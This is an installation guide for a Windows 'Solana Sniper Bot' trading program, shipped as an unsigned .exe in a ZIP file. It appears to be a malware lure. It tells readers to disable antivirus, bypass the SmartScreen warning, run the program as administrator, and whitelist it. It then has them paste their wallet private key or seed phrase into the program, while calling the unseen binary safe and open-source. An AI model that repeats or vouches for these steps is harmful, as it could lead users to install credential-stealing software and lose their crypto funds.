# 🔧 Solana Sniper Bot - Complete Installation Guide

## 📋 Table of Contents

- [System Requirements](#-system-requirements)
- [Pre-Installation Checklist](#-pre-installation-checklist)
- [Step-by-Step Installation](#-step-by-step-installation)
- [First-Time Setup](#-first-time-setup)
- [RPC Configuration](#-rpc-configuration)
- [Wallet Setup](#-wallet-setup)
- [Troubleshooting](#-troubleshooting)
- [Uninstallation](#-uninstallation)

---

## 💻 System Requirements

### Minimum Requirements

| Component | Requirement |
|-----------|-------------|
| **Operating System** | Windows 10 64-bit (Build 1809+) |
| **Processor** | Intel Core i3-4000 series or AMD Ryzen 3 1200 |
| **RAM** | 4 GB |
| **Storage** | 500 MB free space |
| **Internet** | 5 Mbps stable broadband |
| **Display** | 1280x720 resolution |
| **Additional** | Solana wallet with private key access |

### Recommended for Best Performance

| Component | Requirement |
|-----------|-------------|
| **Operating System** | Windows 11 64-bit (Latest) |
| **Processor** | Intel Core i5-10400 or AMD Ryzen 5 3600+ |
| **RAM** | 8 GB DDR4+ |
| **Storage** | 2 GB SSD |
| **Internet** | 25+ Mbps fiber (<50ms latency to RPC) |
| **Display** | 1920x1080 or higher |
| **Additional** | Premium RPC endpoint (Helius/QuickNode) |

---

## ✅ Pre-Installation Checklist

Before installing, ensure you have:

- [x] **Windows 10/11 64-bit** - Check: Settings → System → About → System type
- [x] **Administrator access** - Required for installation
- [x] **Antivirus temporarily disabled** - May flag the bot as false positive
- [x] **Stable internet connection** - Download size: 24.7 MB
- [x] **Solana wallet** - Phantom, Solflare, or any SPL wallet
- [x] **RPC endpoint** - Public (free) or Premium (recommended)
- [x] **SOL tokens** - For trading and gas fees (minimum 0.5 SOL recommended)

---

## 📥 Step-by-Step Installation

### Step 1: Download the Bot

1. **Visit the official GitHub release page:**
   - Go to: [https://github.com/yourusername/solana-sniper-bot/releases](https://github.com/yourusername/solana-sniper-bot/releases)
   
2. **Download the latest version:**
   - Click on `SolanaSniperBot.zip` (24.7 MB)
   - Current version: v3.8.2 (June 2026)
   
3. **Verify download integrity:**
   - Check file size matches: 24.7 MB
   - Optional: Verify SHA256 checksum (provided on release page)

### Step 2: Extract Files

1. **Locate downloaded file:**
   - Usually in: `C:\Users\YourName\Downloads\`
   
2. **Extract the ZIP archive:**
   - Right-click `SolanaSniperBot.zip`
   - Select **"Extract All..."**
   - Choose destination folder (recommended: `C:\SolanaSniperBot\`)
   - Click **"Extract"**

3. **Verify extraction:**
   - Open the extracted folder
   - You should see these files:
     ```
     C:\SolanaSniperBot\
     ├── SolanaSniperBot.exe
     ├── config-template.json
     ├── README.txt
     ├── LICENSE.txt
     ├── UserGuide.pdf
     ├── VideoTutorials.txt
     └── strategies\ (folder)
     ```

### Step 3: Windows SmartScreen (First Launch)

1. **Run as Administrator:**
   - Right-click `SolanaSniperBot.exe`
   - Select **"Run as administrator"**

2. **If Windows SmartScreen appears:**
   - You'll see: *"Windows protected your PC"*
   - Click **"More info"**
   - Click **"Run anyway"**
   
   ⚠️ **This is normal** - Windows flags unsigned apps. The bot is safe and open-source.

3. **Antivirus warnings:**
   - Some antivirus software may flag trading bots
   - Add exception/whitelist for `SolanaSniperBot.exe`
   - The software is safe - review the open-source code on GitHub

### Step 4: Install Visual C++ Redistributables (If Needed)

If you get an error about missing DLL files:

1. **Download Visual C++ Redistributable:**
   - Visit: [https://aka.ms/vs/17/release/vc_redist.x64.exe](https://aka.ms/vs/17/release/vc_redist.x64.exe)
   
2. **Install the package:**
   - Run `vc_redist.x64.exe`
   - Follow installation wizard
   - Restart computer if prompted

3. **Try launching bot again:**
   - Should now work without DLL errors

---

## 🎯 First-Time Setup

### Welcome Wizard

When you first launch the bot, a setup wizard will guide you through configuration:

#### Screen 1: Welcome

- Click **"Get Started"**

#### Screen 2: Terms & Disclaimer

- Read the terms and risk disclaimer
- Check **"I understand the risks"**
- Click **"I Agree"**

#### Screen 3: Choose Setup Mode

- **Quick Setup** (Recommended for beginners)
  - Pre-configured safe settings
  - Conservative risk parameters
  - Easy 3-step setup
  
- **Advanced Setup** (For experienced users)
  - Full control over all parameters
  - Custom strategy configuration
  - Manual RPC and safety settings

**For this guide, we'll use Quick Setup.**

---

## 🔐 Wallet Setup

### Option A: Import Existing Wallet (Recommended)

1. **Select "Import Wallet"**

2. **Choose import method:**
   - **Private Key Array** (Solana standard format)
   - **Seed Phrase** (12/24 words)
   - **Keystore File** (JSON format)

3. **For Private Key Array:**
   
   **From Phantom Wallet:**
   - Open Phantom
   - Click Settings → Export Private Key
   - Enter password
   - Copy the byte array (looks like: `[123,45,67,...]`)
   - Paste into bot

   **From Solflare:**
   - Open Solflare
   - Click on wallet name → Export Private Key
   - Copy the array
   - Paste into bot

4. **Bot verifies wallet:**
   - Shows your public key
   - Displays current SOL balance
   - Click **"Confirm & Continue"**

### Option B: Generate New Wallet

1. **Select "Generate New Wallet"**

2. **Bot creates fresh wallet:**
   - Displays new public key
   - Shows private key array
   - **⚠️ CRITICAL: Write down or save private key securely!**

3. **Backup private key:**
   - Click **"Copy to Clipboard"**
   - Paste into secure note (encrypted file recommended)
   - Click **"Save to File"** for encrypted backup

4. **Fund the wallet:**
   - Send SOL to the displayed address
   - Minimum 0.5 SOL recommended for testing
   - Bot detects balance and enables trading

### Security Best Practices

✅ **DO:**
- Use a dedicated trading wallet
- Keep only necessary SOL in trading wallet
- Backup private key in multiple secure locations
- Use encrypted storage for keys
- Start with small amounts

❌ **DON'T:**
- Use your main wallet with all your holdings
- Share private key with anyone
- Store private key in plain text
- Screenshot private keys
- Rush without backing up

---

## 🌐 RPC Configuration

### What is an RPC?

An **RPC (Remote Procedure Call)** endpoint is how the bot communicates with the Solana blockchain. Faster RPC = faster trades.

### RPC Options

#### Free Public RPCs

**Pros:** Free, no signup required  
**Cons:** Slower, rate limited, shared with thousands

- **Solana Public RPC:** `https://api.mainnet-beta.solana.com`
  - Speed: Slow (500ms-2s execution)
  - Reliability: Medium (frequent rate limits)
  - Cost: Free

**Use for:** Testing, low-stakes trading

#### Premium RPCs (Recommended)

**Pros:** Fast, reliable, dedicated  
**Cons:** Monthly cost ($30-100/month)

##### 1. Helius (Recommended)

- **Speed:** Very Fast (150-250ms)
- **Features:** Enhanced API, priority routing
- **Pricing:** Free tier available, $30/month Premium
- **Setup:**
  1. Go to [https://helius.dev](https://helius.dev)
  2. Sign up for account
  3. Create new project
  4. Copy RPC URL: `https://mainnet.helius-rpc.com/?api-key=YOUR_KEY`
  5. Paste into bot Settings → Network → Primary RPC

##### 2. QuickNode

- **Speed:** Very Fast (150-280ms)
- **Features:** Analytics, websockets
- **Pricing:** $49/month Discover plan
- **Setup:**
  1. Go to [https://quicknode.com](https://quicknode.com)
  2. Create account
  3. Add Solana Mainnet endpoint
  4. Copy HTTPS URL: `https://your-name.solana-mainnet.quiknode.pro/YOUR_TOKEN/`
  5. Paste into bot

##### 3. Alchemy

- **Speed:** Fast (200-350ms)
- **Features:** Enhanced APIs, monitoring
- **Pricing:** Free tier, $49/month Growth
- **Setup:**
  1. Go to [https://alchemy.com](https://alchemy.com)
  2. Sign up
  3. Create Solana app
  4. Copy API URL
  5. Configure in bot

### Configuring RPC in Bot

1. **Open Settings:**
   - Click **"Settings"** tab
   - Navigate to **"Network"** section

2. **Enter Primary RPC:**
   - Paste your RPC URL
   - Example: `https://mainnet.helius-rpc.com/?api-key=abc123`

3. **Add Backup RPCs (Optional but Recommended):**
   - Add 2-3 backup RPC endpoints
   - Bot auto-fails over if primary goes down
   - Example setup:
     ```
     Primary: Helius Premium
     Backup 1: QuickNode
     Backup 2: Public Solana RPC
     ```

4. **Test Connection:**
   - Click **"Test Connection"** button
   - Bot tests latency and reliability
   - Shows ping time (lower is better)
   - ✅ Green check = connection successful

5. **Configure Advanced Settings:**
   - **Timeout:** 10000ms (default)
   - **Max Retries:** 3 (default)
   - **WebSocket:** Enable for real-time monitoring

---

## ⚙️ Basic Configuration

### Quick Setup Parameters

After wallet and RPC setup, configure your trading strategy:

#### 1. Buy Amount

**How much SOL to spend per snipe:**
- Beginner: 0.05 - 0.1 SOL
- Intermediate: 0.2 - 0.5 SOL
- Advanced: 1+ SOL

#### 2. Slippage Tolerance

**How much price movement to accept:**
- Conservative: 5-10%
- Balanced: 10-15%
- Aggressive: 15-30%

#### 3. Take Profit Targets

**When to sell for profit:**

Default setup:
- 30% position at 2x (100% gain)
- 40% position at 5x (400% gain)
- 30% position at 10x (900% gain)

#### 4. Stop Loss

**When to exit to limit losses:**
- Conservative: -20%
- Balanced: -30%
- Aggressive: -50%

#### 5. Safety Features

**Enable all for beginners:**
- ✅ Honeypot detection
- ✅ Rug pull analysis
- ✅ Minimum liquidity: 5 SOL
- ✅ Max buy tax: 10%
- ✅ Max sell tax: 10%

### Saving Configuration

1. Review all settings
2. Click **"Save Configuration"**
3. Bot creates `config.json` file
4. Ready to start trading!

---

## 🚀 Starting the Bot

### Final Pre-Flight Check

Before starting:
- ✅ Wallet funded with SOL
- ✅ RPC connection tested
- ✅ Settings configured
- ✅ Safety features enabled

### Launch Sequence

1. **Go to Dashboard tab**
2. **Review status indicators:**
   - 🟢 Wallet: Connected
   - 🟢 RPC: Online (latency: XXms)
   - 🟢 Balance: X.XX SOL
   - 🟢 Configuration: Loaded

3. **Click the big green button: "START MONITORING"**

4. **Bot status changes to:**
   - 🟢 **ACTIVE - Monitoring new pools...**

5. **Watch Activity Log:**
   - Real-time feed of detected launches
   - Trade executions
   - Performance updates

**🎉 Congratulations! Your bot is now running.**

---

## 🔧 Troubleshooting

### Common Issues & Solutions

#### Issue 1: Bot Won't Start

**Error:** "Application failed to start"

**Solutions:**
1. Run as Administrator
2. Install Visual C++ Redistributables
3. Disable antivirus temporarily
4. Re-extract ZIP file (may have been corrupted)
5. Redownload from official source

#### Issue 2: "Invalid Private Key" Error

**Error:** Wallet import fails

**Solutions:**
1. Verify private key format (should be array: `[123,45,...]`)
2. Check for extra spaces or characters
3. Ensure you copied the complete key
4. Try different import method (seed phrase vs private key)

#### Issue 3: "RPC Connection Failed"

**Error:** Can't connect to blockchain

**Solutions:**
1. Check internet connection
2. Verify RPC URL is correct (no extra spaces)
3. Test RPC in browser: `YOUR_RPC_URL` should return data
4. Try backup RPC
5. Check if RPC service is down (status.helius.dev, etc.)
6. Firewall may be blocking - add exception

#### Issue 4: Trades Not Executing

**Error:** Bot detects launches but doesn't buy

**Solutions:**
1. Check wallet has sufficient SOL balance
2. Verify trading is enabled (not in monitoring-only mode)
3. Increase slippage tolerance
4. Check if safety filters are blocking all tokens
5. Ensure priority fee is set (auto or manual)
6. RPC may be too slow - upgrade to premium

#### Issue 5: "Transaction Failed" Repeatedly

**Error:** Transactions fail with errors

**Solutions:**
1. Increase priority fee (Settings → Trading → Priority Fee)
2. Increase slippage to 15-20%
3. Check token isn't honeypot (can't be bought/sold)
4. Verify sufficient SOL for gas fees
5. Reduce buy amount (may be too large for liquidity)
6. Wait a few seconds after launch (adjust buy delay)

#### Issue 6: False Positives (Bot Blocks Good Tokens)

**Error:** Safety checks too strict

**Solutions:**
1. Lower safety thresholds (Settings → Safety)
2. Reduce min liquidity requirement
3. Allow higher buy/sell taxes
4. Disable specific checks if confident
5. Whitelist known good developers

#### Issue 7: High CPU/RAM Usage

**Error:** Computer slowing down

**Solutions:**
1. Close other applications
2. Reduce number of monitored DEXs
3. Disable real-time charts
4. Reduce log level (Settings → General → Logging)
5. Restart bot periodically

#### Issue 8: "Insufficient Funds" Error

**Error:** Even with SOL in wallet

**Solutions:**
1. Ensure enough SOL for: buy amount + gas + buffer
2. Recommended: minimum 0.1 SOL more than buy amount
3. Check if funds are staked or locked
4. Verify wallet address matches

### Getting Additional Help

If issues persist:

1. **Check Documentation:**
   - `UserGuide.pdf` in bot folder
   - Online FAQ: [FAQ.md](./FAQ.md)

2. **Discord Support:**
   - Join: [discord.gg/solanasniper](https://discord.gg/solanasniper)
   - #support channel
   - Response time: Usually <1 hour

3. **GitHub Issues:**
   - Search existing issues
   - Report new bug: [GitHub Issues](https://github.com/yourusername/solana-sniper-bot/issues)

4. **Email Support:**
   - support@solanasniperbot.com
   - Include: error message, screenshots, config file
   - Response: 24-48 hours

---

## 🗑️ Uninstallation

### Complete Removal

If you need to uninstall the bot:

1. **Stop the bot:**
   - Click "STOP MONITORING"
   - Close application

2. **Backup your data (if needed):**
   - Settings → Backup → Export Configuration
   - Save your private key if not backed up elsewhere
   - Export trade history (Settings → Export → CSV)

3. **Delete bot folder:**
   - Navigate to installation folder (e.g., `C:\SolanaSniperBot\`)
   - Delete entire folder
   - Empty Recycle Bin

4. **Remove configuration data:**
   - Press `Win + R`
   - Type: `%APPDATA%\SolanaSniperBot`
   - Delete folder if exists

5. **Uninstall complete!**

### Reinstallation

To reinstall:
- Simply follow the installation guide again
- Import your backed-up configuration
- Restore wallet with your saved private key

---

## 🎓 Next Steps

Now that you're installed and running:

1. **📖 Read the User Guide:** `UserGuide.pdf` for detailed feature explanations
2. **🎥 Watch Tutorials:** Check `VideoTutorials.txt` for video links
3. **💬 Join Community:** Discord server for strategies and tips
4. **📊 Start Small:** Begin with small amounts to learn the bot
5. **📈 Optimize:** Adjust settings based on your results

---

<div align="center">

**✅ Installation Complete!**

[![Back to README](https://img.shields.io/badge/Back_to-README-blue?style=for-the-badge)](./README.md)
[![View Features](https://img.shields.io/badge/View-Features-green?style=for-the-badge)](./FEATURES.md)

**Happy Sniping! 🚀**

</div>
